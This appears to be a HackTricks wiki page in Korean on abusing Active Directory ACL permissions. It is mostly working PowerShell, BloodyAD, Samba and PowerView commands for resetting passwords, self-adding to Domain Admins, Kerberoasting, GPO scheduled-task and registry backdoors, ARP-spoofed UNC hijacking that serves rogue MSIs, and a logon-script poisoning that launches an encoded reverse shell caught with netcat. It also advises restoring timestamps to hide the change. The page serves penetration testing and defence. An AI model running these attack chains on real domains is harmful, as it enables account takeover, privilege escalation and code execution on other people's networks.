# Abusing Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**이 페이지는 주로 다음 자료의 기법을 요약한 것입니다** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **및** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. 더 자세한 내용은 원문 글을 확인하세요.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

이 권한은 공격자에게 대상 사용자 계정에 대한 완전한 제어권을 부여합니다. `Get-ObjectAcl` 명령으로 `GenericAll` 권한이 확인되면, 공격자는 다음을 할 수 있습니다:

- **대상 계정의 비밀번호 변경**: `net user <username> <password> /domain`을 사용해 사용자의 비밀번호를 재설정할 수 있습니다.
- Linux에서는 Samba `net rpc`를 통해 SAMR 위에서 동일한 작업을 수행할 수 있습니다:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **계정이 비활성화되어 있으면 UAC 플래그를 해제**: `GenericAll`은 `userAccountControl`을 편집할 수 있게 해줍니다. Linux에서 BloodyAD는 `ACCOUNTDISABLE` 플래그를 제거할 수 있습니다:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: 사용자 계정에 SPN을 할당해 kerberoastable하게 만든 뒤, Rubeus와 targetedKerberoast.py를 사용해 ticket-granting ticket (TGT) 해시를 추출하고 크랙을 시도합니다.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: 사용자에 대해 pre-authentication을 비활성화하여, 해당 계정을 ASREPRoasting에 취약하게 만듭니다.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: 사용자에 대해 `GenericAll` 권한이 있으면 인증서 기반 credential을 추가하고 비밀번호를 변경하지 않고도 그 사용자로 인증할 수 있습니다. See:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll Rights on Group**

이 권한은 공격자가 `Domain Admins` 같은 그룹에 대해 `GenericAll` 권한을 가지고 있으면 그룹 멤버십을 조작할 수 있게 합니다. `Get-NetGroup`으로 그룹의 distinguished name을 식별한 후, 공격자는 다음을 할 수 있습니다:

- **Add Themselves to the Domain Admins Group**: 직접 명령을 사용하거나 Active Directory 또는 PowerSploit 같은 모듈을 사용해 수행할 수 있습니다.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Linux에서도 BloodyAD를 활용해, 대상 그룹에 대해 GenericAll/Write membership 권한을 가지고 있다면 자신을 임의의 그룹에 추가할 수 있습니다. 대상 그룹이 “Remote Management Users”에 중첩되어 있으면, 해당 그룹을 허용하는 호스트에서 즉시 WinRM 액세스를 획득합니다:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

컴퓨터 객체나 사용자 계정에 대해 이러한 권한을 보유하면 다음이 가능합니다:

- **Kerberos Resource-based Constrained Delegation**: 컴퓨터 객체를 takeover할 수 있게 해줍니다.
- **Shadow Credentials**: shadow credentials를 생성할 수 있는 권한을 악용하여 컴퓨터나 사용자 계정을 impersonate하는 데 이 기법을 사용할 수 있습니다.

## **WriteProperty on Group**

사용자가 특정 그룹(예: `Domain Admins`)의 모든 객체에 대해 `WriteProperty` 권한을 가지고 있다면, 다음이 가능합니다:

- **Add Themselves to the Domain Admins Group**: `net user`와 `Add-NetGroupUser` 명령을 조합하여 달성할 수 있으며, 이 방법은 도메인 내에서 privilege escalation을 가능하게 합니다.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

이 권한은 공격자가 그룹 멤버십을 직접 조작하는 명령을 통해 `Domain Admins`와 같은 특정 그룹에 자신을 추가할 수 있게 합니다. 다음 명령 시퀀스를 사용하면 자기 자신을 추가할 수 있습니다:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (자기 멤버십)**

이와 유사한 권한으로, 공격자는 해당 그룹에 대해 `WriteProperty` 권한이 있으면 그룹 속성을 수정하여 자신을 그룹에 직접 추가할 수 있습니다. 이 권한의 확인과 실행은 다음과 같이 수행됩니다:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

사용자에 대해 `User-Force-Change-Password`에 대한 `ExtendedRight`를 보유하면 현재 비밀번호를 알지 못해도 비밀번호 재설정이 가능합니다. 이 권한의 확인과 악용은 PowerShell 또는 대체 명령줄 도구를 통해 수행할 수 있으며, 대화형 세션과 비대화형 환경용 원라이너를 포함해 사용자의 비밀번호를 재설정하는 여러 방법을 제공합니다. 명령은 간단한 PowerShell 호출부터 Linux에서 `rpcclient`를 사용하는 것까지 다양하며, 공격 벡터의 다재다능함을 보여줍니다.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **그룹에 대한 WriteOwner**

공격자가 그룹에 대해 `WriteOwner` 권한을 가지고 있음을 발견하면, 해당 그룹의 소유권을 자신에게 변경할 수 있습니다. 이는 해당 그룹이 `Domain Admins`인 경우 특히 큰 영향을 미치는데, 소유권 변경을 통해 그룹 속성과 멤버십에 대해 더 광범위한 제어가 가능해지기 때문입니다. 이 과정은 `Get-ObjectAcl`로 올바른 객체를 식별한 다음, `Set-DomainObjectOwner`를 사용해 SID 또는 이름으로 소유자를 수정하는 것을 포함합니다.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **User에 대한 GenericWrite**

이 권한은 공격자가 사용자 속성을 수정할 수 있게 합니다. 구체적으로, `GenericWrite` 접근 권한이 있으면 공격자는 사용자의 logon script path를 변경하여 사용자가 로그온할 때 악성 스크립트가 실행되도록 할 수 있습니다. 이는 `Set-ADObject` 명령을 사용해 대상 사용자의 `scriptpath` 속성을 공격자의 스크립트를 가리키도록 업데이트함으로써 달성됩니다.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **Group에서의 GenericWrite**

이 권한을 사용하면 공격자는 그룹 멤버십을 조작할 수 있으며, 자신이나 다른 사용자를 특정 그룹에 추가할 수 있습니다. 이 과정은 credential object를 생성하고, 이를 사용해 그룹에서 사용자를 추가하거나 제거한 뒤, PowerShell 명령으로 멤버십 변경 사항을 확인하는 것을 포함합니다.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Linux에서 Samba `net`은 그룹에 대해 `GenericWrite`를 보유하고 있을 때 멤버를 추가/제거할 수 있습니다( PowerShell/RSAT를 사용할 수 없을 때 유용함):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

AD object를 소유하고 그 object에 대해 `WriteDACL` 권한을 가지고 있으면, attacker는 해당 object에 `GenericAll` 권한을 자기 자신에게 부여할 수 있습니다. 이는 ADSI manipulation을 통해 이루어지며, object에 대한 완전한 control과 그 group memberships를 수정할 수 있는 ability를 제공합니다. 그럼에도 불구하고, Active Directory module의 `Set-Acl` / `Get-Acl` cmdlets를 사용해 이 privileges를 exploit하려고 하면 limitations가 존재합니다.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner quick takeover (PowerView)

사용자나 서비스 계정에 대해 `WriteOwner`와 `WriteDacl` 권한이 있으면, 전체 제어권을 가져오고 이전 비밀번호를 몰라도 PowerView를 사용해 비밀번호를 재설정할 수 있습니다:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Notes:
- `WriteOwner`만 가지고 있다면, 먼저 소유자를 자신으로 변경해야 할 수 있습니다:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- 비밀번호 재설정 후 어떤 프로토콜(SMB/LDAP/RDP/WinRM)로든 access를 검증합니다.

## **도메인 복제(DCSync)**

DCSync attack은 도메인의 특정 replication permissions를 활용해 Domain Controller를 가장하고, user credentials를 포함한 data를 synchronize합니다. 이 강력한 technique은 `DS-Replication-Get-Changes` 같은 permissions가 필요하며, 공격자는 Domain Controller에 직접 access하지 않고도 AD 환경의 sensitive information을 추출할 수 있습니다. [**DCSync attack에 대해 더 알아보기.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Group Policy Objects (GPOs)를 관리하도록 delegated access를 부여하면 상당한 security risks가 생길 수 있습니다. 예를 들어, `offense\spotless` 같은 user에게 GPO management rights가 delegated 되어 있다면, **WriteProperty**, **WriteDacl**, **WriteOwner** 같은 privileges를 가질 수 있습니다. 이러한 permissions는 악의적인 목적으로 abuse될 수 있으며, PowerView로 다음과 같이 식별할 수 있습니다: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### GPO Permissions 열거

잘못 설정된 GPOs를 식별하려면 PowerSploit의 cmdlets를 연결해서 사용할 수 있습니다. 이를 통해 특정 user가 관리할 수 있는 GPOs를 찾을 수 있습니다: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**특정 Policy가 적용된 Computers**: 특정 GPO가 어떤 computers에 적용되는지 확인할 수 있어 potential impact의 범위를 이해하는 데 도움이 됩니다. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**특정 Computer에 적용된 Policies**: 특정 computer에 어떤 policies가 적용되어 있는지 보려면 `Get-DomainGPO` 같은 commands를 사용할 수 있습니다.

**특정 Policy가 적용된 OUs**: 특정 policy의 영향을 받는 organizational units (OUs)를 식별하려면 `Get-DomainOU`를 사용할 수 있습니다.

또한 [**GPOHound**](https://github.com/cogiceo/GPOHound) tool을 사용해 GPOs를 열거하고 그 안의 issues를 찾을 수 있습니다.

### Abuse GPO - New-GPOImmediateTask

잘못 설정된 GPOs는 code를 실행하는 데 악용될 수 있습니다. 예를 들어 즉시 scheduled task를 생성할 수 있습니다. 이를 통해 영향을 받는 machines의 local administrators group에 user를 추가해 privileges를 크게 상승시킬 수 있습니다:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy module은 설치되어 있다면 새로운 GPO를 생성하고 연결할 수 있으며, 레지스트리 값 같은 preferences를 설정해 영향을 받는 컴퓨터에서 backdoors를 실행할 수 있다. 이 방법은 실행을 위해 GPO가 업데이트되고 사용자가 해당 컴퓨터에 로그인해야 한다:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - GPO 악용

SharpGPOAbuse는 새 GPO를 만들 필요 없이 기존 GPO에 작업을 추가하거나 설정을 수정해 악용하는 방법을 제공합니다. 이 도구는 기존 GPO를 수정하거나, 변경 사항을 적용하기 전에 RSAT tools를 사용해 새 GPO를 생성해야 합니다:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Force Policy Update

GPO 업데이트는 일반적으로 약 90분마다 발생합니다. 이 과정을, 특히 변경 사항을 적용한 직후에, 더 빠르게 진행하려면 대상 컴퓨터에서 `gpupdate /force` 명령을 사용해 즉시 정책 업데이트를 강제할 수 있습니다. 이 명령은 다음 자동 업데이트 주기를 기다리지 않고 GPO의 모든 수정 사항이 적용되도록 보장합니다.

### Under the Hood

예를 들어 `Misconfigured Policy` 같은 특정 GPO의 Scheduled Tasks를 살펴보면, `evilTask`와 같은 작업이 추가된 것을 확인할 수 있습니다. 이러한 작업은 시스템 동작을 변경하거나 권한을 상승시키기 위해 스크립트나 명령줄 도구를 통해 생성됩니다.

`New-GPOImmediateTask`로 생성된 XML 구성 파일에 나타난 작업 구조는 실행될 명령과 트리거를 포함하여 scheduled task의 세부 사항을 설명합니다. 이 파일은 GPO 내에서 scheduled task가 어떻게 정의되고 관리되는지를 보여주며, 정책 적용의 일부로 임의의 명령이나 스크립트를 실행하는 방법을 제공합니다.

### Users and Groups

GPO는 대상 시스템에서 user 및 group 멤버십을 조작하는 것도 허용합니다. Users and Groups policy 파일을 직접 수정하면 공격자는 로컬 `administrators` group 같은 권한이 있는 그룹에 사용자를 추가할 수 있습니다. 이는 GPO 관리 권한 위임을 통해 가능하며, 정책 파일을 수정해 새 사용자를 포함하거나 group 멤버십을 변경할 수 있게 합니다.

Users and Groups용 XML 구성 파일은 이러한 변경이 어떻게 구현되는지 설명합니다. 이 파일에 항목을 추가하면, 영향을 받는 시스템 전반에서 특정 사용자에게 상승된 권한을 부여할 수 있습니다. 이 방법은 GPO 조작을 통해 privilege escalation을 수행하는 직접적인 접근 방식입니다.

또한 logon/logoff scripts를 활용하거나, autoruns용 registry keys를 수정하거나, .msi 파일을 통해 software를 설치하거나, service 구성을 편집하는 것과 같은 code 실행 또는 persistence 유지의 추가 방법도 고려할 수 있습니다. 이러한 기술은 GPO abuse를 통해 접근을 유지하고 대상 시스템을 제어하는 다양한 경로를 제공합니다.

### WriteGPLink + UNC path hijacking (ARP spoofing)

OU/domain에 대해 `WriteGPLink`를 사용하면 대상 컨테이너의 `gPLink` attribute를 수정하고, GPO 자체를 편집하지 않고도 **기존 GPO를 강제로 적용**할 수 있습니다. 연결된 GPO가 이미 **UNC paths**(`\\HOST\share\...`)를 통해 원격 콘텐츠를 참조하고 있다면 이것이 흥미로워집니다. 인증된 사용자는 **SYSVOL**을 읽을 수 있고, 재사용 가능한 policy를 오프라인에서 찾아낼 수 있기 때문입니다.

상위 수준의 workflow:

1. BloodHound를 사용해 OU에 대해 `WriteGPLink`를 가진 principal을 식별하고, 그 OU 안의 computers/users를 열거합니다.
2. `SYSVOL`을 read-only로 복제하고, **Software Installation**, **drive mappings**(`Drives.xml`), 그리고 UNC paths를 참조하는 **logon/startup scripts**를 찾아 GPO를 분석합니다.
3. DFS/domain-namespace 경로보다 **직접 hostname**을 가리키는 policy를 우선합니다(예: `\\DC02\share\pkg.msi`). hostname 기반 경로가 L2 spoofing으로 리디렉션하기 더 쉽기 때문입니다.
4. 선택한 GPO GUID를 대상 OU의 `gPLink`에 추가하여, 피해자가 이미 존재하는 해당 policy를 처리하게 합니다.
5. 같은 broadcast domain에서 UNC host를 ARP spoof하고, 그 IP를 로컬에 바인딩합니다(`ip addr add <target_ip>/32 dev <iface>`). 그러면 피해자의 SMB traffic이 공격자 호스트로 도달합니다.
6. 공격자 SMB server(예: `smbserver.py`)에서 예상되는 path/filename을 제공하고, 정상적인 policy processing을 기다립니다.

예시 `SYSVOL` 수집 및 GPO 상관관계:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
기존 GPO를 대상 OU에 연결:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

연결된 GPO가 UNC 경로에서 MSI를 배포하면, 클라이언트는 **컴퓨터 시작 시** 이를 가져와 **`NT AUTHORITY\SYSTEM`**으로 설치한다. 참조된 호스트를 스푸핑하고 **같은 share/path/name** 아래에 악성 MSI를 제공하면, **SYSVOL을 수정하지 않고도** `WriteGPLink`를 SYSTEM 코드 실행으로 바꿀 수 있다.

중요한 제약 사항:

- **타이밍이 중요**하다: 새 링크는 policy refresh 시 보이지만(일반적으로 약 90분), **Software Installation**은 보통 **reboot** 시 트리거된다.
- Windows Installer는 보통 패키지의 **`ProductCode`**를 사용해 배포를 추적한다. 제품이 이미 설치되어 있으면 배포가 건너뛰어질 수 있다.
- 설치 프로그램의 거부를 피하려면, rogue MSI의 **`ProductCode`**와 **`PackageCode`**를 GPO가 기대하는 정상 패키지와 일치하도록 패치한다.
- 오래된 `.aas` advertisement 파일이 여전히 `SYSVOL`에 남아 있을 수 있으므로, 의존하기 전에 배포가 여전히 활성 상태처럼 보이는지 확인하라.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

`Drives.xml`의 GPP drive mappings는 로그온 또는 재연결 시 사용자가 구성된 UNC 경로로 인증하게 만듭니다. 참조된 호스트를 spoof하면 **NetNTLMv2**를 캡처할 수 있습니다. SMB를 의도적으로 실패하게 만들면 Windows가 **WebDAV**로 재시도하여 **HTTP를 통한 NTLM**을 전송할 수 있으며, 이는 **LDAP(S)**, **AD CS**, 또는 **SMB**로의 relay에 훨씬 더 유연합니다.

#### Logon/startup script UNC hijack

같은 패턴이 `SYSVOL`에서 발견되는 UNC-hosted scripts에도 적용됩니다:

- **Logon scripts**는 보통 **user** 컨텍스트에서 실행됩니다.
- **Startup scripts**는 보통 **computer / SYSTEM** 컨텍스트에서 실행됩니다.

script path가 spoof 가능한 hostname을 가리킨다면, UNC host를 redirect하고 기대되는 위치에서 대체 script content를 제공하세요.

## SYSVOL/NETLOGON Logon Script Poisoning

`\\<dc>\SYSVOL\<domain>\scripts\` 또는 `\\<dc>\NETLOGON\` 아래의 writable paths는 GPO를 통해 user logon 시 실행되는 logon scripts를 tamper할 수 있게 합니다. 이는 로그인하는 사용자의 security context에서 code execution을 가능하게 합니다.

### Locate logon scripts
- 구성된 logon script에 대해 user attributes를 inspect:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- 도메인 공유를 크롤링하여 바로가기 또는 스크립트 참조를 찾아내기:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- `.lnk` 파일을 파싱하여 SYSVOL/NETLOGON을 가리키는 대상의 경로를 확인하기 (유용한 DFIR 트릭이며, 직접 GPO 접근 권한이 없는 공격자에게도 유용함):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound은 존재할 경우 사용자 노드에 `logonScript` (scriptPath) 속성을 표시합니다.

### 쓰기 권한 검증하기 (share listings를 신뢰하지 말 것)
자동화 도구는 SYSVOL/NETLOGON을 읽기 전용으로 표시할 수 있지만, 실제 NTFS ACL은 여전히 쓰기를 허용할 수 있습니다. 항상 테스트하세요:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
### RCE를 위한 VBScript logon script poisoning
PowerShell reverse shell(revshells.com에서 생성)를 실행하는 command를 append하고, business function이 깨지지 않도록 original logic은 유지하세요:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
호스트에서 리슨하고 다음 interactive logon을 기다리세요:
```bash
rlwrap -cAr nc -lnvp 443
```
참고:

- Execution은 logging user의 token 아래에서 발생합니다(SYSTEM 아님). 범위는 해당 script를 적용하는 GPO link(OU, site, domain)입니다.
- 사용 후 original content/timestamps를 복원하여 정리하세요.


## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
